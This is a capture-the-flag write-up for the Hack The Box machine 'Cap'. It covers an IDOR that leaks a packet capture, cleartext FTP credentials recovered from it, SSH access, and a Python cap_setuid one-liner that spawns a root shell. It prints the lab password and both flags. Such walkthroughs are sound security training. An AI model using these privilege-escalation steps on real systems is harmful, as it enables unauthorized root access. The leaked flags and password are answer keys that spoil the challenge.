---
title: "Hack The Box: Cap"
date: 2025-12-31
tags: ["HackTheBox", "Linux", "IDOR", "Capabilities", "Easy"]
author: "Federico Sella"
summary: "An Easy Linux machine highlighting the importance of securing network traffic and managing Linux Capabilities correctly."
cover:
    image: "/images/writeups/cap/htb-cap.png"
    alt: "HTB Cap Machine"
    relative: false
---

_नोट: तकनीकी सटीकता बनाए रखने के लिए, यह सामग्री मूल भाषा (अंग्रेजी) में दिखाई गई है।_

---

**Machine IP:** `10.129.28.172` | **Difficulty:** Easy | **OS:** Linux

Cap is an Easy Linux machine from Hack The Box that highlights the importance of securing network traffic and managing Linux Capabilities correctly. The exploitation path involves an **IDOR vulnerability**, analyzing a **PCAP file** for cleartext credentials, and abusing `cap_setuid` on a Python binary for privilege escalation.

## 1. Enumeration
I started with a full port scan using Nmap to identify running services.

```bash
nmap -sC -sV -p- -T4 10.129.28.172

```

![Nmap Scan Results](/images/writeups/cap/1-nmap.png)

**Results:**
The scan revealed three open ports:

* **21/tcp (FTP):** vsftpd 3.0.3
* **22/tcp (SSH):** OpenSSH 8.2p1 Ubuntu
* **80/tcp (HTTP):** Gunicorn (hosting a "Security Dashboard")

## 2. Web Exploitation (IDOR)

Visiting `http://10.129.28.172`, I found a dashboard displaying network statistics. Navigating to the "Security Snapshot" section, I noticed the URL structure followed a pattern: `/data/1`, `/data/2`, etc.

Testing for **Insecure Direct Object Reference (IDOR)**, I manually changed the URL ID to 0:

> `http://10.129.28.172/data/0`

![IDOR](/images/writeups/cap/2-idor.png)

This triggered the download of a file named `0.pcap`.

## 3. Traffic Analysis

I analyzed the `0.pcap` file using **Wireshark**. Since port 21 (FTP) was open, I filtered the traffic for FTP packets.

![Wireshark](/images/writeups/cap/3-wireshark.png)

As FTP sends data in cleartext, I quickly located a login attempt containing credentials:

* **User:** `nathan`
* **Password:** `Buck3tH4TF0RM3!`

## 4. Initial Access (User Flag)

Using the retrieved credentials, I logged in via SSH:

```bash
ssh nathan@10.129.28.172

```

Once inside, I retrieved the user flag:

```bash
cat user.txt
# Output: 46b57e86780ae3b8882d42155f9f8e1e

```

## 5. Privilege Escalation

To escalate privileges, I enumerated the Linux Capabilities of binaries on the system. This is often a quick win on Linux machines.

```bash
getcap -r / 2>/dev/null

```

**Output:**

```plaintext
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

The `cap_setuid` capability on Python is critical. It allows the process to manipulate its UID (User ID). I exploited this to spawn a **root shell** by setting the UID to 0:

```python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

I successfully verified my identity as root and grabbed the final flag.

```bash
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)

cat /root/root.txt
# Output: c07497cf599cefbe24d502d470c852b3

```

![root](/images/writeups/cap/4-root.png)
